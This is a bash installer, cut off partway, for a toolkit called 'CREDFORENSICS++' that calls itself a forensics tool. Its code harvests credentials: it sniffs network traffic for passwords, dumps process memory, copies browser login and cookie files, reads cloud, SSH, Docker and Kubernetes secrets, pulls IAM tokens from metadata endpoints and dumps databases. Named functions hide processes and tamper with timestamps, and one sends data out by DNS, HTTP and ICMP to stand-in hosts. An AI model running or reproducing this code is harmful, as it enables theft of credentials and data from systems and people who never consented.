#!/bin/bash
# CREDFORENSICS++ Enhanced Credential Forensics Toolkit
# For authorized security assessments and incident response only

set -euo pipefail

# Configuration
REPO_URL="https://github.com/YOUR_USERNAME/credforensics-plus"
INSTALL_DIR="$HOME/.credforensics-plus"
BIN_DIR="$HOME/.local/bin"
TOOL_NAME="cfplus"
DATA_DIR="$INSTALL_DIR/data"
PATTERNS_DIR="$INSTALL_DIR/patterns"
CACHE_DIR="$INSTALL_DIR/cache"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Platform detection
detect_platform() {
    case "$(uname -s)" in
        Linux*)     platform="linux";;
        Darwin*)    platform="macos";;
        CYGWIN*)    platform="cygwin";;
        MINGW*)     platform="mingw";;
        *)          platform="unknown"
    esac
    echo "$platform"
}

# Architecture detection
detect_arch() {
    case "$(uname -m)" in
        x86_64|amd64)   arch="amd64";;
        aarch64|arm64)  arch="arm64";;
        arm*)           arch="arm";;
        *)              arch="unknown"
    esac
    echo "$arch"
}

# Check dependencies
check_deps() {
    local missing=()
    local recommended=()
    
    echo -e "${BLUE}Checking dependencies...${NC}"
    
    # Required dependencies
    for cmd in curl grep awk sed find; do
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$cmd")
        fi
    done
    
    # Recommended dependencies
    for cmd in jq python3 sqlite3 nmap ss lsof netstat strings; do
        if ! command -v "$cmd" &> /dev/null; then
            recommended+=("$cmd")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}Missing required dependencies:${NC} ${missing[*]}"
        exit 1
    fi
    
    if [ ${#recommended[@]} -gt 0 ]; then
        echo -e "${YELLOW}Recommended dependencies not found:${NC} ${recommended[*]}"
        echo -e "${YELLOW}Some features may be limited.${NC}"
    fi
}

# Download enhanced toolkit
download_toolkit() {
    echo -e "${BLUE}Downloading CREDFORENSICS++ toolkit...${NC}"
    
    # Create directories
    mkdir -p "$INSTALL_DIR" "$DATA_DIR" "$PATTERNS_DIR" "$CACHE_DIR" \
             "$INSTALL_DIR/modules" "$INSTALL_DIR/plugins" "$INSTALL_DIR/templates"
    
    # Main script
    echo -e "${YELLOW}Downloading main toolkit...${NC}"
    curl -sSL "https://raw.githubusercontent.com/YOUR_USERNAME/credforensics-plus/main/cfplus.sh" \
        -o "$INSTALL_DIR/cfplus.sh"
    
    # Enhanced pattern databases
    echo -e "${YELLOW}Downloading enhanced patterns...${NC}"
    for pattern in api_keys aws azure gcp ssh certificates jwt database; do
        curl -sSL "https://raw.githubusercontent.com/YOUR_USERNAME/credforensics-plus/main/patterns/${pattern}.json" \
            -o "$PATTERNS_DIR/${pattern}.json" 2>/dev/null || true
    done
    
    # Download advanced modules
    echo -e "${YELLOW}Downloading advanced modules...${NC}"
    for module in memory browser cloud docker kubernetes network database \
                  process forensics timeline evasion encryption stealth; do
        curl -sSL "https://raw.githubusercontent.com/YOUR_USERNAME/credforensics-plus/main/modules/${module}.sh" \
            -o "$INSTALL_DIR/modules/${module}.sh" 2>/dev/null || true
    done
    
    # Download plugins
    echo -e "${YELLOW}Downloading plugins...${NC}"
    for plugin in telegram discord slack chrome firefox bitwarden keepass \
                  lastpass ssh_agent gpg docker_registry; do
        curl -sSL "https://raw.githubusercontent.com/YOUR_USERNAME/credforensics-plus/main/plugins/${plugin}.sh" \
            -o "$INSTALL_DIR/plugins/${plugin}.sh" 2>/dev/null || true
    done
    
    # Download evasion templates
    echo -e "${YELLOW}Downloading evasion templates...${NC}"
    curl -sSL "https://raw.githubusercontent.com/YOUR_USERNAME/credforensics-plus/main/templates/evasion.json" \
        -o "$INSTALL_DIR/templates/evasion.json" 2>/dev/null || true
    
    # Make executables
    chmod +x "$INSTALL_DIR/cfplus.sh" "$INSTALL_DIR/modules"/*.sh "$INSTALL_DIR/plugins"/*.sh 2>/dev/null || true
    
    # Create symlink
    ln -sf "$INSTALL_DIR/cfplus.sh" "$BIN_DIR/$TOOL_NAME"
}

# Install enhanced core functions
install_core_functions() {
    cat << 'EOF' > "$INSTALL_DIR/core_functions.sh"
#!/bin/bash
# CREDFORENSICS++ Core Functions

# Stealth mode logging
_log() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case $level in
        "DEBUG") [[ "$CF_DEBUG" == "true" ]] && echo "[$timestamp] DEBUG: $message" >> "$CF_LOG_FILE" ;;
        "INFO") echo "[$timestamp] INFO: $message" >> "$CF_LOG_FILE" ;;
        "WARN") echo "[$timestamp] WARN: $message" >> "$CF_LOG_FILE" ;;
        "ERROR") echo "[$timestamp] ERROR: $message" >> "$CF_LOG_FILE" ;;
    esac
}

# Memory-safe string extraction
_safe_extract() {
    local input="$1"
    local pattern="$2"
    
    # Use different extraction methods based on available tools
    if command -v grep &> /dev/null; then
        echo "$input" | grep -oE "$pattern" 2>/dev/null || true
    elif command -v awk &> /dev/null; then
        echo "$input" | awk 'match($0,/'$pattern'/) {print substr($0, RSTART, RLENGTH)}' 2>/dev/null || true
    else
        echo "$input" | sed -nE "s/.*($pattern).*/\1/p" 2>/dev/null || true
    fi
}

# Encrypted cache storage
_cache_store() {
    local key="$1"
    local value="$2"
    local cache_file="$CACHE_DIR/${key}.enc"
    
    # Simple XOR encryption for cache (for demonstration)
    echo "$value" | openssl enc -aes-256-cbc -salt -pass pass:"$CF_CACHE_KEY" -base64 2>/dev/null > "$cache_file" || true
}

_cache_retrieve() {
    local key="$1"
    local cache_file="$CACHE_DIR/${key}.enc"
    
    [ -f "$cache_file" ] || return 1
    openssl enc -aes-256-cbc -d -salt -pass pass:"$CF_CACHE_KEY" -base64 2>/dev/null < "$cache_file" || return 1
}

# Pattern matching with context
_match_with_context() {
    local file="$1"
    local pattern="$2"
    local context_lines=3
    
    if command -v grep &> /dev/null; then
        grep -n -i -C "$context_lines" -E "$pattern" "$file" 2>/dev/null || true
    else
        # Fallback to awk
        awk -v pattern="$pattern" -v context="$context_lines" '
            BEGIN { IGNORECASE=1 }
            $0 ~ pattern {
                for (i = NR-context; i <= NR+context; i++) {
                    if (i in lines) print lines[i]
                }
                delete lines
            }
            { lines[NR] = NR ": " $0 }
        ' "$file" 2>/dev/null || true
    fi
}

# Process memory dumping
_dump_process_memory() {
    local pid="$1"
    local output_dir="$2"
    
    [ -z "$pid" ] && return 1
    [ ! -d "/proc/$pid" ] && return 1
    
    mkdir -p "$output_dir"
    
    # Try different memory dumping methods
    if command -v gdb &> /dev/null && [ "$UID" -eq 0 ]; then
        # Use gdb for full memory dump
        gdb -p "$pid" -batch -ex "dump memory $output_dir/mem.dump 0 0" 2>/dev/null
    elif [ -f "/proc/$pid/mem" ] && [ "$UID" -eq 0 ]; then
        # Direct memory access
        cat "/proc/$pid/mem" > "$output_dir/mem.dump" 2>/dev/null
    elif command -v strings &> /dev/null; then
        # Strings from process memory maps
        strings "/proc/$pid/maps" > "$output_dir/maps.txt" 2>/dev/null
    fi
}

# Network credential sniffing
_sniff_network_credentials() {
    local interface="${1:-any}"
    local output_file="${2:-$DATA_DIR/network_creds.txt}"
    local duration="${3:-30}"
    
    if command -v tcpdump &> /dev/null && [ "$UID" -eq 0 ]; then
        echo -e "${YELLOW}[*] Sniffing network traffic for credentials (${duration}s)...${NC}"
        timeout "$duration" tcpdump -i "$interface" -A -s 0 -l 2>/dev/null | \
            grep -E "(password|passwd|pwd|login|user|token|key|secret|Authorization:|Bearer)" | \
            tee -a "$output_file"
    elif command -v ngrep &> /dev/null && [ "$UID" -eq 0 ]; then
        timeout "$duration" ngrep -d "$interface" -W byline -q "password|token|key" 2>/dev/null | \
            tee -a "$output_file"
    fi
}

# Browser credential extraction
_extract_browser_creds() {
    local browser="$1"
    local output_dir="$DATA_DIR/browser_${browser}"
    
    mkdir -p "$output_dir"
    
    case "$browser" in
        "chrome")
            # Chrome credential locations
            local chrome_paths=(
                "$HOME/.config/google-chrome"
                "$HOME/.config/chromium"
                "$HOME/Library/Application Support/Google/Chrome"
                "$HOME/AppData/Local/Google/Chrome"
            )
            ;;
        "firefox")
            local firefox_paths=(
                "$HOME/.mozilla/firefox"
                "$HOME/Library/Application Support/Firefox"
                "$HOME/AppData/Roaming/Mozilla/Firefox"
            )
            ;;
        "brave")
            local brave_paths=(
                "$HOME/.config/BraveSoftware"
                "$HOME/Library/Application Support/BraveSoftware"
            )
            ;;
    esac
    
    # Extract cookies, passwords, and local storage
    for path in "${paths[@]}"; do
        [ -d "$path" ] && {
            find "$path" -type f \( -name "Cookies" -o -name "Login Data" -o -name "*.sqlite" \) \
                -exec cp {} "$output_dir/" \; 2>/dev/null
        }
    done
    
    # Try to decrypt if possible
    if command -v python3 &> /dev/null; then
        python3 -c "
import sqlite3, os, json
output = []
for file in os.listdir('$output_dir'):
    if file.endswith('.sqlite'):
        try:
            conn = sqlite3.connect(os.path.join('$output_dir', file))
            cursor = conn.cursor()
            cursor.execute('SELECT name FROM sqlite_master WHERE type=\"table\";')
            tables = cursor.fetchall()
            output.append({'file': file, 'tables': tables})
            conn.close()
        except:
            pass
print(json.dumps(output, indent=2))
" > "$output_dir/db_structure.json"
    fi
}

# Cloud credential discovery
_discover_cloud_creds() {
    local providers=("aws" "azure" "gcp" "digitalocean" "heroku" "cloudflare")
    
    for provider in "${providers[@]}"; do
        case "$provider" in
            "aws")
                # AWS credentials
                [ -f "$HOME/.aws/credentials" ] && {
                    echo "[*] Found AWS credentials"
                    cat "$HOME/.aws/credentials"
                }
                # AWS environment variables
                env | grep -E "(AWS_|AKIA|ASIA)" || true
                ;;
            "azure")
                # Azure CLI
                [ -f "$HOME/.azure/accessTokens.json" ] && {
                    echo "[*] Found Azure tokens"
                    jq -r '.[] | .accessToken' "$HOME/.azure/accessTokens.json" 2>/dev/null || true
                }
                ;;
            "gcp")
                # GCP credentials
                [ -f "$HOME/.config/gcloud/credentials.db" ] && {
                    echo "[*] Found GCP credentials"
                    sqlite3 "$HOME/.config/gcloud/credentials.db" "SELECT * FROM credentials;" 2>/dev/null || true
                }
                ;;
        esac
    done
}

# Docker credential extraction
_extract_docker_creds() {
    # Docker config
    [ -f "$HOME/.docker/config.json" ] && {
        echo "[*] Docker configuration found"
        jq -r '.auths | to_entries[] | "\(.key): \(.value.auth)"' "$HOME/.docker/config.json" 2>/dev/null | \
            while read -r line; do
                echo "$line" | base64 -d 2>/dev/null || echo "$line"
            done
    }
    
    # Docker swarm secrets
    if command -v docker &> /dev/null; then
        docker secret ls -q 2>/dev/null | while read -r secret; do
            echo "[*] Docker secret: $secret"
            docker secret inspect "$secret" 2>/dev/null | jq -r '.[0].Spec.Data' | base64 -d 2>/dev/null || true
        done
    fi
}

# SSH agent and key extraction
_extract_ssh_creds() {
    # SSH keys
    find "$HOME/.ssh" -type f -name "id_*" ! -name "*.pub" 2>/dev/null | while read -r key; do
        echo "[*] SSH private key: $key"
        [ -f "$key" ] && head -c 100 "$key"
        echo
    done
    
    # SSH agent
    if [ -n "$SSH_AUTH_SOCK" ]; then
        echo "[*] SSH agent socket: $SSH_AUTH_SOCK"
        ssh-add -L 2>/dev/null || true
    fi
    
    # SSH config with ProxyCommand
    [ -f "$HOME/.ssh/config" ] && {
        grep -E "(ProxyCommand|IdentityFile|HostName)" "$HOME/.ssh/config" || true
    }
}

# Timeline analysis
_create_timeline() {
    local output_file="$DATA_DIR/timeline.csv"
    
    echo "Timestamp,Event,Source,Details" > "$output_file"
    
    # System logs
    if [ -d "/var/log" ]; then
        find /var/log -type f -name "*.log" -mtime -7 2>/dev/null | while read -r log; do
            tail -100 "$log" 2>/dev/null | grep -E "(auth|login|ssh|su|sudo)" | \
                while read -r line; do
                    echo "$(date '+%Y-%m-%d %H:%M:%S'),LOG_EVENT,$log,$line" >> "$output_file"
                done
        done
    fi
    
    # User activity
    last -n 50 2>/dev/null | while read -r line; do
        echo "$(date '+%Y-%m-%d %H:%M:%S'),USER_LOGIN,last,$line" >> "$output_file"
    done
}

# Advanced evasion techniques
_evade_detection() {
    local technique="$1"
    
    case "$technique" in
        "memory_only")
            # Run entirely in memory
            exec < <(cat /dev/urandom | head -c 1M)
            ;;
        "process_hiding")
            # Hide process arguments
            mount -n --bind /dev/shm "/proc/$$"
            ;;
        "network_stealth")
            # Use existing connections
            if command -v socat &> /dev/null; then
                socat - TCP4:127.0.0.1:443,bind=127.0.0.2
            fi
            ;;
        "time_stomping")
            # Manipulate timestamps
            touch -d "1 hour ago" "$0"
            ;;
    esac
}

# Data exfiltration methods
_exfiltrate_data() {
    local data="$1"
    local method="$2"
    
    case "$method" in
        "dns")
            # DNS exfiltration
            echo "$data" | xxd -p -c 32 | while read -r chunk; do
                dig +short "$chunk.example.com" >/dev/null 2>&1
                sleep 0.1
            done
            ;;
        "http")
            # HTTP POST
            curl -X POST -d "$data" "https://example.com/log" >/dev/null 2>&1
            ;;
        "icmp")
            # ICMP payload
            echo "$data" | xxd -p | while read -r chunk; do
                ping -c 1 -p "$chunk" 8.8.8.8 >/dev/null 2>&1
            done
            ;;
        "multipart")
            # Split and encode
            echo "$data" | split -b 1000 - "$CACHE_DIR/part."
            for part in "$CACHE_DIR"/part.*; do
                base64 "$part" > "${part}.b64"
            done
            ;;
    esac
}
EOF
    
    chmod +x "$INSTALL_DIR/core_functions.sh"
}

# Install advanced modules
install_advanced_modules() {
    # Memory forensics module
    cat << 'EOF' > "$INSTALL_DIR/modules/memory_advanced.sh"
#!/bin/bash
# Advanced Memory Forensics Module

module_memory_advanced() {
    echo -e "${PURPLE}[*] Advanced Memory Forensics${NC}"
    
    # Process memory analysis
    _analyze_process_memory() {
        local pid="$1"
        
        echo -e "${CYAN}[+] Analyzing process memory for PID: $pid${NC}"
        
        # Extract strings from process memory
        if command -v strings &> /dev/null; then
            strings "/proc/$pid/mem" 2>/dev/null | \
                grep -E "(password|token|key|secret|AKIA|sk_|xox)" > \
                "$DATA_DIR/process_${pid}_strings.txt" || true
        fi
        
        # Analyze memory maps
        [ -f "/proc/$pid/maps" ] && {
            cat "/proc/$pid/maps" > "$DATA_DIR/process_${pid}_maps.txt"
            
            # Look for heap and stack
            grep -E "(heap|stack)" "/proc/$pid/maps" | while read -r line; do
                echo "[*] Memory region: $line"
            done
        }
        
        # Check for injected libraries
        lsof -p "$pid" 2>/dev/null | grep -E "\.so" | \
            grep -vE "(libc|ld-linux|libpthread)" || true
    }
    
    # Full system memory dump (requires root)
    _dump_system_memory() {
        [ "$UID" -ne 0 ] && {
            echo -e "${YELLOW}[!] Root required for full memory dump${NC}"
            return
        }
        
        echo -e "${CYAN}[+] Dumping system memory${NC}"
        
        # Try LiME if available
        if modprobe -n lime 2>/dev/null; then
            echo -e "${GREEN}[+] LiME kernel module available${NC}"
        fi
        
        # Try fmem if available
        if [ -f "/dev/fmem" ]; then
            dd if=/dev/fmem of="$DATA_DIR/full_memory.dump" bs=1M count=100 2>/dev/null
        fi
        
        # Process list with memory usage
        ps aux --sort=-rss | head -20 > "$DATA_DIR/top_processes.txt"
    }
    
    # Extract credentials from memory
    _extract_memory_creds() {
        echo -e "${CYAN}[+] Scanning memory for credentials${NC}"
        
        # Search for common credential patterns
        local patterns=(
            "password[=:]\s*['\"]?[^'\"]+"
            "token[=:]\s*['\"]?[^'\"]+"
            "apikey[=:]\s*['\"]?[^'\"]+"
            "secret[=:]\s*['\"]?[^'\"]+"
            "AKIA[0-9A-Z]{16}"
            "sk_[a-zA-Z0-9]{32}"
        )
        
        # Check running processes
        for pid in $(ps -eo pid | tail -n +2); do
            [ -d "/proc/$pid" ] || continue
            
            # Skip kernel threads
            [ "$(readlink -f /proc/$pid/exe 2>/dev/null)" = "" ] && continue
            
            for pattern in "${patterns[@]}"; do
                grep -r "$pattern" "/proc/$pid/" 2>/dev/null | \
                    while read -r match; do
                        echo "[PID:$pid] $match" >> "$DATA_DIR/memory_credentials.txt"
                    done
            done
        done
    }
    
    # Analyze memory for malware
    _detect_memory_malware() {
        echo -e "${CYAN}[+] Detecting memory-based malware${NC}"
        
        # Look for hidden processes
        for pid in $(ls -d /proc/[0-9]* 2>/dev/null | cut -d/ -f3); do
            [ ! -e "/proc/$pid/exe" ] && {
                echo "[!] Process without executable: $pid" >> "$DATA_DIR/suspicious.txt"
            }
            
            # Check for packed binaries
            if command -v readelf &> /dev/null; then
                readelf -h "/proc/$pid/exe" 2>/dev/null | grep -q "UPX" && {
                    echo "[!] UPX packed binary: $pid" >> "$DATA_DIR/suspicious.txt"
                }
            fi
        done
        
        # Check for code injection
        for map in /proc/*/maps; do
            grep -q "rwxp" "$map" 2>/dev/null && {
                pid=$(echo "$map" | cut -d/ -f3)
                echo "[!] Executable writable memory: $pid" >> "$DATA_DIR/suspicious.txt"
            }
        done
    }
    
    # Run all memory analysis
    _analyze_process_memory "$$"
    _dump_system_memory
    _extract_memory_creds
    _detect_memory_malware
}
EOF

    # Network forensics module
    cat << 'EOF' > "$INSTALL_DIR/modules/network_advanced.sh"
#!/bin/bash
# Advanced Network Forensics Module

module_network_advanced() {
    echo -e "${PURPLE}[*] Advanced Network Forensics${NC}"
    
    # Capture live traffic
    _capture_live_traffic() {
        local interface="${1:-any}"
        local duration="${2:-60}"
        local output="$DATA_DIR/network_capture.pcap"
        
        [ "$UID" -ne 0 ] && {
            echo -e "${YELLOW}[!] Root required for packet capture${NC}"
            return
        }
        
        echo -e "${CYAN}[+] Capturing network traffic for ${duration}s${NC}"
        
        if command -v tcpdump &> /dev/null; then
            timeout "$duration" tcpdump -i "$interface" -w "$output" -s 0 2>/dev/null &
            local tcpdump_pid=$!
            
            # Monitor for credentials during capture
            timeout "$duration" tcpdump -i "$interface" -A -s 0 -l 2>/dev/null | \
                grep -E "(login|pass|token|key|secret|Authorization)" | \
                tee "$DATA_DIR/live_credentials.txt"
            
            wait "$tcpdump_pid" 2>/dev/null
        fi
    }
    
    # Analyze existing connections
    _analyze_connections() {
        echo -e "${CYAN}[+] Analyzing network connections${NC}"
        
        # Active connections
        if command -v ss &> /dev/null; then
            ss -tupan > "$DATA_DIR/connections_ss.txt"
        elif command -v netstat &> /dev/null; then
            netstat -tupan > "$DATA_DIR/connections_netstat.txt"
        fi
        
        # Listening services
        lsof -i -P -n | grep LISTEN > "$DATA_DIR/listening_services.txt"
        
        # DNS cache
        if [ -f "/var/run/nscd/db" ]; then
            strings "/var/run/nscd/db" > "$DATA_DIR/dns_cache.txt" 2>/dev/null
        fi
    }
    
    # Extract credentials from packets
    _extract_packet_creds() {
        local pcap_file="$1"
        
        [ ! -f "$pcap_file" ] && return
        
        echo -e "${CYAN}[+] Extracting credentials from packets${NC}"
        
        if command -v tshark &> /dev/null; then
            # HTTP credentials
            tshark -r "$pcap_file" -Y "http.authbasic" -T fields \
                -e ip.src -e http.authbasic 2>/dev/null > "$DATA_DIR/http_auth.txt"
            
            # FTP credentials
            tshark -r "$pcap_file" -Y "ftp.request.command == USER || ftp.request.command == PASS" \
                -T fields -e ip.src -e ftp.request.command -e ftp.request.arg 2>/dev/null > "$DATA_DIR/ftp_auth.txt"
            
            # SMTP authentication
            tshark -r "$pcap_file" -Y "smtp.req.parameter == \"AUTH\"" \
                -T fields -e ip.src -e smtp.req.parameter 2>/dev/null > "$DATA_DIR/smtp_auth.txt"
        fi
    }
    
    # Detect C2 communications
    _detect_c2_traffic() {
        echo -e "${CYAN}[+] Detecting C2 communications${NC}"
        
        # Suspicious domains
        local suspicious_domains=(
            "pastebin.com" "github.io" "azurewebsites.net"
            "herokuapp.com" "ngrok.io" "serveo.net"
        )
        
        # Check DNS queries
        if [ -f "/var/log/syslog" ]; then
            for domain in "${suspicious_domains[@]}"; do
                grep -i "$domain" /var/log/syslog 2>/dev/null | \
                    head -20 > "$DATA_DIR/suspicious_dns_${domain//./_}.txt"
            done
        fi
        
        # Check for beaconing
        if command -v tcpdump &> /dev/null && [ "$UID" -eq 0 ]; then
            timeout 10 tcpdump -i any -c 100 2>/dev/null | \
                awk '{print $3}' | sort | uniq -c | sort -rn | \
                head -20 > "$DATA_DIR/top_connections.txt"
        fi
    }
    
    # SSL/TLS certificate extraction
    _extract_ssl_certs() {
        echo -e "${CYAN}[+] Extracting SSL/TLS certificates${NC}"
        
        # From memory
        if command -v grep &> /dev/null; then
            grep -r "BEGIN CERTIFICATE" /proc/*/ 2>/dev/null | \
                head -20 > "$DATA_DIR/memory_certificates.txt"
        fi
        
        # From filesystem
        find /etc /usr/share -name "*.crt" -o -name "*.pem" 2>/dev/null | \
            head -50 > "$DATA_DIR/certificate_files.txt"
    }
    
    # Run all network analysis
    _capture_live_traffic "any" 30
    _analyze_connections
    [ -f "$DATA_DIR/network_capture.pcap" ] && _extract_packet_creds "$DATA_DIR/network_capture.pcap"
    _detect_c2_traffic
    _extract_ssl_certs
}
EOF

    # Cloud forensics module
    cat << 'EOF' > "$INSTALL_DIR/modules/cloud_advanced.sh"
#!/bin/bash
# Advanced Cloud Forensics Module

module_cloud_advanced() {
    echo -e "${PURPLE}[*] Advanced Cloud Forensics${NC}"
    
    # Multi-cloud discovery
    _discover_cloud_env() {
        echo -e "${CYAN}[+] Discovering cloud environment${NC}"
        
        # Check for cloud metadata
        local metadata_urls=(
            "http://169.254.169.254"
            "http://169.254.169.254/metadata"
            "http://100.100.100.200"
            "http://192.0.0.192"
        )
        
        for url in "${metadata_urls[@]}"; do
            if curl -s -m 3 "$url" &> /dev/null; then
                echo "[+] Cloud metadata endpoint found: $url"
                
                # Try to get metadata
                curl -s -m 5 "$url/latest/meta-data/" 2>/dev/null | \
                    head -20 > "$DATA_DIR/cloud_metadata.txt"
                
                # Try to get user-data
                curl -s -m 5 "$url/latest/user-data" 2>/dev/null | \
                    head -100 >> "$DATA_DIR/cloud_userdata.txt"
            fi
        done
        
        # Check cloud-init
        [ -f "/var/lib/cloud/instance/user-data.txt" ] && {
            cp "/var/lib/cloud/instance/user-data.txt" "$DATA_DIR/cloud_init_userdata.txt"
        }
    }
    
    # AWS specific
    _analyze_aws() {
        echo -e "${CYAN}[+] Analyzing AWS environment${NC}"
        
        # Instance metadata
        curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null | \
            while read -r item; do
                [ -n "$item" ] && curl -s "http://169.254.169.254/latest/meta-data/$item" 2>/dev/null | \
                    head -5 > "$DATA_DIR/aws_metadata_${item//\//_}.txt"
            done
        
        # IAM credentials
        curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null | \
            while read -r role; do
                [ -n "$role" ] && curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null \
                    > "$DATA_DIR/aws_iam_${role}.json"
            done
        
        # Check for AWS CLI
        if command -v aws &> /dev/null; then
            aws sts get-caller-identity > "$DATA_DIR/aws_identity.json" 2>/dev/null
            aws configure list > "$DATA_DIR/aws_config.txt" 2>/dev/null
        fi
    }
    
    # Azure specific
    _analyze_azure() {
        echo -e "${CYAN}[+] Analyzing Azure environment${NC}"
        
        # Azure Instance Metadata Service (IMDS)
        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null \
            > "$DATA_DIR/azure_metadata.json"
        
        # Attested data (includes VM unique ID)
        curl -s -H "Metadata: true" "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>/dev/null \
            > "$DATA_DIR/azure_attested.json"
        
        # Check for Azure CLI
        if command -v az &> /dev/null; then
            az account show > "$DATA_DIR/azure_account.json" 2>/dev/null
            az ad signed-in-user show > "$DATA_DIR/azure_user.json" 2>/dev/null
        fi
    }
    
    # GCP specific
    _analyze_gcp() {
        echo -e "${CYAN}[+] Analyzing GCP environment${NC}"
        
        # GCP metadata
        curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/" 2>/dev/null | \
            while read -r item; do
                [ -n "$item" ] && curl -s -H "Metadata-Flavor: Google" \
                    "http://169.254.169.254/computeMetadata/v1/$item" 2>/dev/null | \
                    head -5 > "$DATA_DIR/gcp_metadata_${item//\//_}.txt"
            done
        
        # Service accounts
        curl -s -H "Metadata-Flavor: Google" \
            "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/" 2>/dev/null | \
            while read -r account; do
                [ -n "$account" ] && {
                    curl -s -H "Metadata-Flavor: Google" \
                        "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/${account}token" \
                        > "$DATA_DIR/gcp_token_${account%/}.json" 2>/dev/null
                }
            done
        
        # Check for gcloud CLI
        if command -v gcloud &> /dev/null; then
            gcloud config list > "$DATA_DIR/gcp_config.txt" 2>/dev/null
            gcloud auth list > "$DATA_DIR/gcp_auth.txt" 2>/dev/null
        fi
    }
    
    # Kubernetes specific
    _analyze_kubernetes() {
        echo -e "${CYAN}[+] Analyzing Kubernetes environment${NC}"
        
        # Check if we're in a pod
        if [ -f "/var/run/secrets/kubernetes.io/serviceaccount/token" ]; then
            echo "[+] Running in Kubernetes pod"
            
            # Service account token
            cp "/var/run/secrets/kubernetes.io/serviceaccount/token" "$DATA_DIR/k8s_token.txt"
            
            # Namespace
            cp "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "$DATA_DIR/k8s_namespace.txt"
            
            # CA certificate
            cp "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt" "$DATA_DIR/k8s_ca.crt"
            
            # Try to access Kubernetes API
            local token=$(cat "$DATA_DIR/k8s_token.txt")
            curl -s -k -H "Authorization: Bearer $token" \
                "https://kubernetes.default.svc/api/v1/pods" > "$DATA_DIR/k8s_pods.json" 2>/dev/null
            
            curl -s -k -H "Authorization: Bearer $token" \
                "https://kubernetes.default.svc/api/v1/secrets" > "$DATA_DIR/k8s_secrets.json" 2>/dev/null
        fi
        
        # Check for kubectl
        if command -v kubectl &> /dev/null; then
            kubectl get secrets --all-namespaces -o json > "$DATA_DIR/k8s_all_secrets.json" 2>/dev/null
            kubectl get configmaps --all-namespaces -o json > "$DATA_DIR/k8s_configmaps.json" 2>/dev/null
        fi
    }
    
    # Run all cloud analysis
    _discover_cloud_env
    _analyze_aws
    _analyze_azure
    _analyze_gcp
    _analyze_kubernetes
}
EOF

    # Database forensics module
    cat << 'EOF' > "$INSTALL_DIR/modules/database_advanced.sh"
#!/bin/bash
# Advanced Database Forensics Module

module_database_advanced() {
    echo -e "${PURPLE}[*] Advanced Database Forensics${NC}"
    
    # Discover database connections
    _discover_databases() {
        echo -e "${CYAN}[+] Discovering database connections${NC}"
        
        # Check running database services
        local db_ports=("3306" "5432" "27017" "1433" "1521" "6379" "9200")
        
        for port in "${db_ports[@]}"; do
            if command -v ss &> /dev/null; then
                ss -tulpn | grep -q ":$port" && echo "[+] Database port $port in use"
            elif command -v netstat &> /dev/null; then
                netstat -tulpn | grep -q ":$port" && echo "[+] Database port $port in use"
            fi
        done
        
        # Check for database configuration files
        find /etc /opt /home -type f \( \
            -name "*.cnf" -o \
            -name "*.conf" -o \
            -name "my.cnf" -o \
            -name "postgresql.conf" -o \
            -name "mongod.conf" \
            \) 2>/dev/null | head -50 > "$DATA_DIR/db_config_files.txt"
    }
    
    # Extract database credentials
    _extract_db_creds() {
        echo -e "${CYAN}[+] Extracting database credentials${NC}"
        
        # MySQL/MariaDB
        find /etc /home -name ".my.cnf" -o -name ".mylogin.cnf" 2>/dev/null | \
            while read -r file; do
                echo "[+] MySQL config: $file"
                grep -E "(user|password|host)" "$file" 2>/dev/null || cat "$file"
                echo
            done
        
        # PostgreSQL
        find /etc /home -name ".pgpass" -o -name "pgpass.conf" 2>/dev/null | \
            while read -r file; do
                echo "[+] PostgreSQL passwords: $file"
                cat "$file" 2>/dev/null
                echo
            done
        
        [ -f "$HOME/.pgpass" ] && {
            echo "[+] User PostgreSQL passwords"
            cat "$HOME/.pgpass" 2>/dev/null
        }
        
        # MongoDB
        find /etc /home -name ".mongorc.js" -o -name "mongodb.conf" 2>/dev/null | \
            while read -r file; do
                echo "[+] MongoDB config: $file"
                grep -E "(password|auth)" "$file" 2>/dev/null
            done
        
        # Redis
        [ -f "/etc/redis/redis.conf" ] && {
            echo "[+] Redis config"
            grep -E "(requirepass|masterauth)" "/etc/redis/redis.conf" 2>/dev/null
        }
        
        # Elasticsearch
        [ -f "/etc/elasticsearch/elasticsearch.yml" ] && {
            echo "[+] Elasticsearch config"
            grep -E "(password|key)" "/etc/elasticsearch/elasticsearch.yml" 2>/dev/null
        }
    }
    
    # Dump database contents
    _dump_databases() {
        echo -e "${CYAN}[+] Dumping database contents${NC}"
        
        # Try MySQL/MariaDB
        if command -v mysql &> /dev/null; then
            echo "[+] Attempting MySQL dump"
            mysql -e "SHOW DATABASES;" 2>/dev/null > "$DATA_DIR/mysql_databases.txt"
            
            # Try to dump each database
            mysql -e "SHOW DATABASES;" 2>/dev/null | tail -n +2 | \
                while read -r db; do
                    echo "[+] Dumping MySQL database: $db"
                    mysqldump --skip-lock-tables "$db" 2>/dev/null > \
                        "$DATA_DIR/mysql_dump_${db}.sql"
                done
        fi
        
        # Try PostgreSQL
        if command -v psql &> /dev/null; then
            echo "[+] Attempting PostgreSQL dump"
            psql -l 2>/dev/null > "$DATA_DIR/postgres_databases.txt"
            
            # Try to dump each database
            psql -l 2>/dev/null | awk 'NR>2{print $1}' | \
                while read -r db; do
                    [ "$db" = "Name" ] && continue
                    [ -z "$db" ] && continue
                    echo "[+] Dumping PostgreSQL database: $db"
                    pg_dump "$db" 2>/dev/null > \
                        "$DATA_DIR/postgres_dump_${db}.sql"
                done
        fi
        
        # Try MongoDB
        if command -v mongo &> /dev/null; then
            echo "[+] Attempting MongoDB dump"
            mongo --quiet --eval "show dbs" 2>/dev/null > "$DATA_DIR/mongodb_databases.txt"
